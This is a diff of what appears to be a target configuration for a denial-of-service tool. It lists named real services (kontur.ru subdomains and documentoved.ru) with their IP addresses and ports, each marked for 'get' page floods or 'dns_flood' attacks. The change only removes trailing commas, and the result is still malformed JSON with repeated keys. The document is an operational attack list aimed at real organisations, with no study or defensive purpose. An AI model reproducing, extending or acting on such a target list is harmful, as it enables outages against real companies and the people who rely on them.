@@ -16,13 +16,13 @@
     {"method": "get", "page": "https://www.documentoved.ru"},
     {"method": "get", "page": "https://school.kontur.ru/main"}, 
     {"method": "get", "page": "https://x5.kontur.ru"}, 
-    {"method": "get", "page": "https://postavki.kontur.ru"},
+    {"method": "get", "page": "https://postavki.kontur.ru"}
     {
         "method": "dns_flood",
         "name": "kontur.ru",
         "ip": "46.17.203.102",
         "port": "80, 443",
-        "domains": "kontur.ru", 
+        "domains": "kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -30,7 +30,7 @@
         "ip": "46.17.206.15",
         "port": 80,
         "port": 443, 
-        "domains": "auth.kontur.ru",  
+        "domains": "auth.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -39,7 +39,7 @@
         "port": 443,
         "port": 8080,
         "port": 8081,
-        "domains": "ofd.kontur.ru", 
+        "domains": "ofd.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -50,7 +50,7 @@
         "domains": [
             "kontur-extern.ru",
             "e-kontur.ru",
-            "b-kontur.ru",
+            "b-kontur.ru"
         ]
     }
     {
@@ -59,7 +59,7 @@
         "ip": "46.17.203.41",
         "port": 80,
         "port": 443, 
-        "domains": "elba.kontur.ru/AccessControl/Login",  
+        "domains": "elba.kontur.ru/AccessControl/Login"
     }
     {
         "method": "dns_flood",
@@ -67,7 +67,7 @@
         "ip": "46.17.204.249",
         "port": 80,
         "port": 443, 
-        "domains": "pf.kontur.ru",  
+        "domains": "pf.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -75,7 +75,7 @@
         "ip": "46.17.203.131",
         "port": 80,
         "port": 443, 
-        "domains": "ca.kontur.ru",  
+        "domains": "ca.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -83,7 +83,7 @@
         "ip": "46.17.203.33",
         "port": 80,
         "port": 443, 
-        "domains": "normativ.kontur.ru",   
+        "domains": "normativ.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -93,7 +93,7 @@
         "port": 443, 
         "domains": [
             "install.kontur.ru",
-            "help.kontur.ru",
+            "help.kontur.ru"
         ]  
     }
     {
@@ -101,7 +101,7 @@
         "name": "focus.kontur.ru",
         "ip": "46.17.206.17",
         "port": 443, 
-        "domains": "focus.kontur.ru",
+        "domains": "focus.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -109,7 +109,7 @@
         "ip": "46.173.221.106",
         "port": 80,
         "port": 443, 
-        "domains": "kontur.documentoved.ru",
+        "domains": "kontur.documentoved.ru"
     }
     {
         "method": "dns_flood",
@@ -121,14 +121,14 @@
         "port": 445,
         "port": 3389,
         "port": 5986,    
-        "domains": "documentoved.ru",
+        "domains": "documentoved.ru"
     }
     {
         "method": "dns_flood",
         "name": "school.kontur.ru/main",
         "ip": "46.17.203.72",
         "port": 443, 
-        "domains": "school.kontur.ru/main",
+        "domains": "school.kontur.ru/main"
     }
     {
         "method": "dns_flood",
@@ -136,7 +136,7 @@
         "ip": "46.17.207.135",
         "port": 80,
         "port": 443, 
-        "domains": "x5.kontur.ru",   
+        "domains": "x5.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -144,7 +144,7 @@
         "ip": "46.17.203.11",
         "port": 80,
         "port": 443, 
-        "domains": "postavki.kontur.ru",   
+        "domains": "postavki.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -160,7 +160,7 @@
         "port": 5938, 
         "port": 8443, 
         "port": 8444, 
-        "domains": "postavki.kontur.ru",
+        "domains": "postavki.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -168,7 +168,7 @@
         "ip": "46.17.203.250",
         "port": 80,
         "port": 443, 
-        "domains": "postavki.kontur.ru",
+        "domains": "postavki.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -176,7 +176,7 @@
         "ip": "46.17.204.245",
         "port": 80,
         "port": 443, 
-        "domains": "postavki.kontur.ru",
+        "domains": "postavki.kontur.ru"
     }
     {
         "method": "dns_flood",
@@ -184,6 +184,6 @@
         "ip": "46.17.200.242",
         "port": 80,
         "port": 443, 
-        "domains": "postavki.kontur.ru",
+        "domains": "postavki.kontur.ru"
     }
 ]
